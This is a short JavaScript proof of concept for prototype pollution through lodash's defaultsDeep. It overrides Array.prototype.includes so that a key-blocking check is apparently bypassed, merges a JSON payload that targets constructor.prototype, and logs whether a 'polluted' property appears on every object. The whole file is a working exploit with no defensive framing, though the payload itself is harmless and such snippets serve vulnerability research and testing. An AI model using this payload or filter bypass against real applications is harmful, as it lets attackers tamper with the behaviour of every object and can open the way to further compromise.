Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
console.log({}.polluted);
mergeFn({}, JSON.parse(payload));
console.log({}.polluted);